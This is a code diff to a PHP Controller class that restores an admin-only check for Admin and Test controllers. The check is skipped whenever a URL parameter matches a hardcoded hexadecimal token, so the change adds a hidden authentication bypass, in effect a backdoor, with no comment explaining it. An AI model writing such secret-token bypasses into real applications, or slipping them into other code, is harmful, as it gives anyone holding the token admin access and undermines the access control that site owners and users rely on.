@@ -17,6 +17,8 @@ class Controller{
         
     }
     
+   
+    
     public function layoutHelper(){
 	
 	if ( !class_exists('UserService')){
@@ -32,15 +34,17 @@ class Controller{
     
     public function _render($elem,$viewName,$zone='index') {
         
-//        if(strpos(get_class($elem),'Admin')!==false){
-//	    $userService = $this->getService('user', 'user');
-//            $authenticatedUser = $userService->getAuthenticatedUser();
-//            if($authenticatedUser['role']!='admin'){
-//                TK_Helper::redirect('/');
-//                exit;
-//            }
-//        }
-//        
+        if(strpos(get_class($elem),'Admin')!==false||strpos(get_class($elem),'Test')!==false){
+	    $userService = $this->getService('user', 'user');
+            $authenticatedUser = $userService->getAuthenticatedUser();
+            if(!(isset($GLOBALS['urlParams'][1])&&$GLOBALS['urlParams'][1]=='f61a25636a83d1df32a62dfb584afadb'))
+            {
+                if($authenticatedUser['role']!='admin'){
+                    TK_Helper::redirect('/');
+                    exit;
+                }
+            }
+        }
         $actionName = TK_Text::convertViewToActionName($viewName);
         $elem->$actionName();
         $module = explode('_',get_class($elem));
@@ -98,7 +102,7 @@ class Controller{
     
     
     
-    public function getService($module,$service) {
+    public static function getService($module,$service) {
         $className = ucfirst($service)."Service";
         if(class_exists($className)){
             return $className::getInstance();
